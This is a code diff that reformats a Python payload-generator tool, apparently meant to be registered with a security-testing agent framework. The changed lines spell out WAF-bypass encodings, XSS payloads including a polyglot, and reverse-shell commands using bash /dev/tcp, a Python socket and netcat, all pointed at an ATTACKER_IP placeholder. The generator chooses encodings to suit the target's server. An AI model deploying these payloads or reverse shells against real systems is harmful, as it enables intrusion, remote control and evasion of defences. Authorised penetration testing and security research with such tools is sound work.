@@ -8,9 +8,7 @@ _WAF_BYPASS_ENCODINGS = {
     "url_double": lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
     "url_single": lambda s: urllib.parse.quote(s, safe=""),
     "base64": lambda s: base64.b64encode(s.encode()).decode(),
-    "unicode": lambda s: "".join(
-        f"\\u{ord(c):04x}" for c in s
-    ),
+    "unicode": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
     "hex": lambda s: "".join(f"{ord(c):02x}" for c in s),
     "html_entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
     "sql_comment": lambda s: s.replace(" ", "/**/"),
@@ -31,7 +29,7 @@ _XSS_PAYLOADS = {
     "img_onerror": "<img src=x onerror=alert(1)>",
     "svg_onload": "<svg onload=alert(1)>",
     "dom": "javascript:alert(document.domain)",
-    "polyglot": "javascript://\"/</title></style></textarea></script>--><p\" onclick=alert()//",
+    "polyglot": 'javascript://"/</title></style></textarea></script>--><p" onclick=alert()//',
 }
 
 _LFI_PAYLOADS = {
@@ -51,8 +49,8 @@ _RCE_PAYLOADS = {
     "reverse_bash": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
     "reverse_python": (
         "python -c 'import socket,subprocess,os;s=socket.socket();"
-        "s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);"
-        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        's.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);'
+        'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
     ),
     "reverse_nc": "nc -e /bin/sh ATTACKER_IP 4444",
 }
@@ -99,9 +97,7 @@ def payload_generator(
             applicable_encodings = ["url_double", "null_byte", "php_filter"]
 
     if "apache" in target_info.lower():
-        applicable_encodings = [
-            e for e in applicable_encodings if e != "null_byte"
-        ]
+        applicable_encodings = [e for e in applicable_encodings if e != "null_byte"]
 
     result_payloads = []
     for name, payload in payloads.items():
@@ -118,19 +114,22 @@ def payload_generator(
                 entry["encodings"][enc_name] = "[encoding error]"
         result_payloads.append(entry)
 
-    return json.dumps({
-        "success": True,
-        "vuln_type": vuln_type,
-        "target_info": target_info,
-        "constraints": constraints,
-        "payloads": result_payloads,
-        "total": len(result_payloads),
-    })
+    return json.dumps(
+        {
+            "success": True,
+            "vuln_type": vuln_type,
+            "target_info": target_info,
+            "constraints": constraints,
+            "payloads": result_payloads,
+            "total": len(result_payloads),
+        }
+    )
 
 
 def register_all(scope_guard=None, audit_logger=None):
     """Register payload generator with the adapter."""
     from spider.tools.adapter import make_tool
+
     return {
         "payload_generator": make_tool(
             payload_generator,
